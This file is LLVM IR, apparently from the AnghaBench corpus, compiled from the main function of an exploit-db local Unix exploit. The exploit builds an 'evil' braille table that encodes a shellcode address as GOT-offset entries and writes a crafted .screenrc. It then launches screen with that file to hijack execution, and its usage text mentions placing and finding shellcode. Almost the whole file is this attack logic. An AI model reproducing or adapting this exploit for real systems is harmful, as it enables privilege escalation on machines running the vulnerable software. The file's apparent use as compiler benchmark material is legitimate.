; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_21414.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_21414.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@stderr = common dso_local global i32* null, align 8
@.str = private unnamed_addr constant [74 x i8] c"\0A%s [ -p ] [ -f ] [ -a <shellcode address> -o <offset to GOT address> ]\0A\0A\00", align 1
@.str.1 = private unnamed_addr constant [40 x i8] c"-p switch places shellcode into memory\0A\00", align 1
@.str.2 = private unnamed_addr constant [36 x i8] c"-f switch finds shellcode address\0A\0A\00", align 1
@.str.3 = private unnamed_addr constant [38 x i8] c"No switch runs exploit with options:\0A\00", align 1
@.str.4 = private unnamed_addr constant [25 x i8] c"\09-a <shellcode address>\0A\00", align 1
@.str.5 = private unnamed_addr constant [30 x i8] c"\09-o <offset to GOT address>\0A\0A\00", align 1
@OFFSET = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [7 x i8] c"pfa:o:\00", align 1
@EOF = common dso_local global i8 0, align 1
@PUT = common dso_local global i32 0, align 4
@FIND = common dso_local global i32 0, align 4
@optarg = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [3 x i8] c"%p\00", align 1
@.str.8 = private unnamed_addr constant [11 x i8] c"hehehehe?\0A\00", align 1
@.str.9 = private unnamed_addr constant [32 x i8] c". preparing evil braille table\0A\00", align 1
@TABLE = common dso_local global i8* null, align 8
@.str.10 = private unnamed_addr constant [2 x i8] c"w\00", align 1
@.str.11 = private unnamed_addr constant [6 x i8] c"fopen\00", align 1
@.str.12 = private unnamed_addr constant [48 x i8] c". converting: 0x%lx into braille table strings\0A\00", align 1
@.str.13 = private unnamed_addr constant [10 x i8] c"%d ff %s\0A\00", align 1
@.str.14 = private unnamed_addr constant [31 x i8] c". writing to braille table: %s\00", align 1
@.str.15 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.16 = private unnamed_addr constant [28 x i8] c". preparing evil .screenrc\0A\00", align 1
@SCREENRC = common dso_local global i8* null, align 8
@.str.17 = private unnamed_addr constant [21 x i8] c"bd_start_braille on\0A\00", align 1
@.str.18 = private unnamed_addr constant [21 x i8] c"bd_braille_table %s\0A\00", align 1
@.str.19 = private unnamed_addr constant [25 x i8] c"bd_type powerbraille_40\0A\00", align 1
@.str.20 = private unnamed_addr constant [20 x i8] c"bd_port /dev/ttyS0\0A\00", align 1
@.str.21 = private unnamed_addr constant [32 x i8] c". now exploiting blind, hehehe\0A\00", align 1
@SCREEN = common dso_local global i32 0, align 4
@.str.22 = private unnamed_addr constant [7 x i8] c"screen\00", align 1
@.str.23 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@.str.24 = private unnamed_addr constant [19 x i8] c". error executing\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca [64 x i8], align 16
  %9 = alloca [10 x i8], align 1
  %10 = alloca i8, align 1
  %11 = alloca i64, align 8
  %12 = alloca [4 x i32], align 16
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %17 = load i32, i32* %4, align 4
  %18 = icmp eq i32 %17, 1
  br i1 %18, label %19, label %36

19:                                               ; preds = %2
  %20 = load i32*, i32** @stderr, align 8
  %21 = load i8**, i8*** %5, align 8
  %22 = getelementptr inbounds i8*, i8** %21, i64 0
  %23 = load i8*, i8** %22, align 8
  %24 = call i32 (i32*, i8*, ...) @fprintf(i32* %20, i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str, i64 0, i64 0), i8* %23)
  %25 = load i32*, i32** @stderr, align 8
  %26 = call i32 (i32*, i8*, ...) @fprintf(i32* %25, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.1, i64 0, i64 0))
  %27 = load i32*, i32** @stderr, align 8
  %28 = call i32 (i32*, i8*, ...) @fprintf(i32* %27, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.2, i64 0, i64 0))
  %29 = load i32*, i32** @stderr, align 8
  %30 = call i32 (i32*, i8*, ...) @fprintf(i32* %29, i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.3, i64 0, i64 0))
  %31 = load i32*, i32** @stderr, align 8
  %32 = call i32 (i32*, i8*, ...) @fprintf(i32* %31, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.4, i64 0, i64 0))
  %33 = load i32*, i32** @stderr, align 8
  %34 = call i32 (i32*, i8*, ...) @fprintf(i32* %33, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.5, i64 0, i64 0))
  %35 = call i32 @exit(i32 0) #3
  unreachable

36:                                               ; preds = %2
  %37 = load i32, i32* @OFFSET, align 4
  store i32 %37, i32* %15, align 4
  br label %38

38:                                               ; preds = %69, %36
  %39 = load i32, i32* %4, align 4
  %40 = load i8**, i8*** %5, align 8
  %41 = call signext i8 @getopt(i32 %39, i8** %40, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.6, i64 0, i64 0))
  store i8 %41, i8* %10, align 1
  %42 = sext i8 %41 to i32
  %43 = load i8, i8* @EOF, align 1
  %44 = sext i8 %43 to i32
  %45 = icmp ne i32 %42, %44
  br i1 %45, label %46, label %70

46:                                               ; preds = %38
  %47 = load i8, i8* %10, align 1
  %48 = sext i8 %47 to i32
  switch i32 %48, label %65 [
    i32 112, label %49
    i32 102, label %53
    i32 97, label %57
    i32 111, label %62
  ]

49:                                               ; preds = %46
  %50 = load i32, i32* @PUT, align 4
  %51 = call i32 @stuff(i32 %50)
  %52 = call i32 @exit(i32 0) #3
  unreachable

53:                                               ; preds = %46
  %54 = load i32, i32* @FIND, align 4
  %55 = call i32 @stuff(i32 %54)
  %56 = call i32 @exit(i32 0) #3
  unreachable

57:                                               ; preds = %46
  %58 = load i32, i32* @optarg, align 4
  %59 = call i32 @sscanf(i32 %58, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i64 0, i64 0), i8** %7)
  %60 = load i8*, i8** %7, align 8
  %61 = ptrtoint i8* %60 to i64
  store i64 %61, i64* %11, align 8
  br label %69

62:                                               ; preds = %46
  %63 = load i32, i32* @optarg, align 4
  %64 = call i32 @atoi(i32 %63)
  store i32 %64, i32* %15, align 4
  br label %69

65:                                               ; preds = %46
  %66 = load i32*, i32** @stderr, align 8
  %67 = call i32 (i32*, i8*, ...) @fprintf(i32* %66, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.8, i64 0, i64 0))
  %68 = call i32 @exit(i32 0) #3
  unreachable

69:                                               ; preds = %62, %57
  br label %38

70:                                               ; preds = %38
  %71 = load i32*, i32** @stderr, align 8
  %72 = call i32 (i32*, i8*, ...) @fprintf(i32* %71, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.9, i64 0, i64 0))
  %73 = load i8*, i8** @TABLE, align 8
  %74 = call i32* @fopen(i8* %73, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.10, i64 0, i64 0))
  store i32* %74, i32** %16, align 8
  %75 = icmp eq i32* %74, null
  br i1 %75, label %76, label %79

76:                                               ; preds = %70
  %77 = call i32 @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.11, i64 0, i64 0))
  %78 = call i32 @exit(i32 1) #3
  unreachable

79:                                               ; preds = %70
  %80 = load i32*, i32** @stderr, align 8
  %81 = load i64, i64* %11, align 8
  %82 = call i32 (i32*, i8*, ...) @fprintf(i32* %80, i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.12, i64 0, i64 0), i64 %81)
  %83 = load i64, i64* %11, align 8
  %84 = and i64 %83, 255
  %85 = trunc i64 %84 to i32
  %86 = getelementptr inbounds [4 x i32], [4 x i32]* %12, i64 0, i64 0
  store i32 %85, i32* %86, align 16
  %87 = load i64, i64* %11, align 8
  %88 = and i64 %87, 65280
  %89 = lshr i64 %88, 8
  %90 = trunc i64 %89 to i32
  %91 = getelementptr inbounds [4 x i32], [4 x i32]* %12, i64 0, i64 1
  store i32 %90, i32* %91, align 4
  %92 = load i64, i64* %11, align 8
  %93 = and i64 %92, 16711680
  %94 = lshr i64 %93, 16
  %95 = trunc i64 %94 to i32
  %96 = getelementptr inbounds [4 x i32], [4 x i32]* %12, i64 0, i64 2
  store i32 %95, i32* %96, align 8
  %97 = load i64, i64* %11, align 8
  %98 = and i64 %97, 4278190080
  %99 = lshr i64 %98, 24
  %100 = trunc i64 %99 to i32
  %101 = getelementptr inbounds [4 x i32], [4 x i32]* %12, i64 0, i64 3
  store i32 %100, i32* %101, align 4
  store i32 0, i32* %13, align 4
  br label %102

102:                                              ; preds = %128, %79
  %103 = load i32, i32* %13, align 4
  %104 = icmp slt i32 %103, 4
  br i1 %104, label %105, label %131

105:                                              ; preds = %102
  %106 = getelementptr inbounds [10 x i8], [10 x i8]* %9, i64 0, i64 0
  %107 = call i32 @memset(i8* %106, i8 signext 111, i32 9)
  %108 = load i32, i32* %13, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds [4 x i32], [4 x i32]* %12, i64 0, i64 %109
  %111 = load i32, i32* %110, align 4
  %112 = getelementptr inbounds [10 x i8], [10 x i8]* %9, i64 0, i64 0
  %113 = call i32 @bta(i32 %111, i8* %112)
  %114 = getelementptr inbounds [64 x i8], [64 x i8]* %8, i64 0, i64 0
  %115 = call i32 @memset(i8* %114, i8 signext 0, i32 64)
  %116 = getelementptr inbounds [64 x i8], [64 x i8]* %8, i64 0, i64 0
  %117 = load i32, i32* %15, align 4
  %118 = load i32, i32* %13, align 4
  %119 = add nsw i32 %117, %118
  %120 = getelementptr inbounds [10 x i8], [10 x i8]* %9, i64 0, i64 0
  %121 = call i32 (i8*, i32, i8*, ...) @snprintf(i8* %116, i32 64, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.13, i64 0, i64 0), i32 %119, i8* %120)
  %122 = load i32*, i32** @stderr, align 8
  %123 = getelementptr inbounds [64 x i8], [64 x i8]* %8, i64 0, i64 0
  %124 = call i32 (i32*, i8*, ...) @fprintf(i32* %122, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.14, i64 0, i64 0), i8* %123)
  %125 = load i32*, i32** %16, align 8
  %126 = getelementptr inbounds [64 x i8], [64 x i8]* %8, i64 0, i64 0
  %127 = call i32 (i32*, i8*, ...) @fprintf(i32* %125, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i64 0, i64 0), i8* %126)
  br label %128

128:                                              ; preds = %105
  %129 = load i32, i32* %13, align 4
  %130 = add nsw i32 %129, 1
  store i32 %130, i32* %13, align 4
  br label %102

131:                                              ; preds = %102
  %132 = load i32*, i32** %16, align 8
  %133 = call i32 @fclose(i32* %132)
  %134 = load i32*, i32** @stderr, align 8
  %135 = call i32 (i32*, i8*, ...) @fprintf(i32* %134, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.16, i64 0, i64 0))
  %136 = load i8*, i8** @SCREENRC, align 8
  %137 = call i32* @fopen(i8* %136, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.10, i64 0, i64 0))
  store i32* %137, i32** %16, align 8
  %138 = icmp eq i32* %137, null
  br i1 %138, label %139, label %142

139:                                              ; preds = %131
  %140 = call i32 @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.11, i64 0, i64 0))
  %141 = call i32 @exit(i32 1) #3
  unreachable

142:                                              ; preds = %131
  %143 = load i32*, i32** %16, align 8
  %144 = call i32 (i32*, i8*, ...) @fprintf(i32* %143, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.17, i64 0, i64 0))
  %145 = getelementptr inbounds [64 x i8], [64 x i8]* %8, i64 0, i64 0
  %146 = call i32 @memset(i8* %145, i8 signext 0, i32 64)
  %147 = getelementptr inbounds [64 x i8], [64 x i8]* %8, i64 0, i64 0
  %148 = load i8*, i8** @TABLE, align 8
  %149 = call i32 (i8*, i32, i8*, ...) @snprintf(i8* %147, i32 64, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.18, i64 0, i64 0), i8* %148)
  %150 = load i32*, i32** %16, align 8
  %151 = getelementptr inbounds [64 x i8], [64 x i8]* %8, i64 0, i64 0
  %152 = call i32 (i32*, i8*, ...) @fprintf(i32* %150, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i64 0, i64 0), i8* %151)
  %153 = load i32*, i32** %16, align 8
  %154 = call i32 (i32*, i8*, ...) @fprintf(i32* %153, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.19, i64 0, i64 0))
  %155 = load i32*, i32** %16, align 8
  %156 = call i32 (i32*, i8*, ...) @fprintf(i32* %155, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.20, i64 0, i64 0))
  %157 = load i32*, i32** %16, align 8
  %158 = call i32 @fclose(i32* %157)
  %159 = load i32*, i32** @stderr, align 8
  %160 = call i32 (i32*, i8*, ...) @fprintf(i32* %159, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.21, i64 0, i64 0))
  %161 = load i32, i32* @SCREEN, align 4
  %162 = load i8*, i8** @SCREENRC, align 8
  %163 = call i64 @execl(i32 %161, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.22, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.23, i64 0, i64 0), i8* %162, i32* null)
  %164 = icmp ne i64 %163, 0
  br i1 %164, label %165, label %169

165:                                              ; preds = %142
  %166 = load i32*, i32** @stderr, align 8
  %167 = call i32 (i32*, i8*, ...) @fprintf(i32* %166, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.24, i64 0, i64 0))
  %168 = call i32 @exit(i32 1) #3
  unreachable

169:                                              ; preds = %142
  %170 = load i32, i32* %3, align 4
  ret i32 %170
}

declare dso_local i32 @fprintf(i32*, i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local signext i8 @getopt(i32, i8**, i8*) #1

declare dso_local i32 @stuff(i32) #1

declare dso_local i32 @sscanf(i32, i8*, i8**) #1

declare dso_local i32 @atoi(i32) #1

declare dso_local i32* @fopen(i8*, i8*) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @memset(i8*, i8 signext, i32) #1

declare dso_local i32 @bta(i32, i8*) #1

declare dso_local i32 @snprintf(i8*, i32, i8*, ...) #1

declare dso_local i32 @fclose(i32*) #1

declare dso_local i64 @execl(i32, i8*, i8*, i8*, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
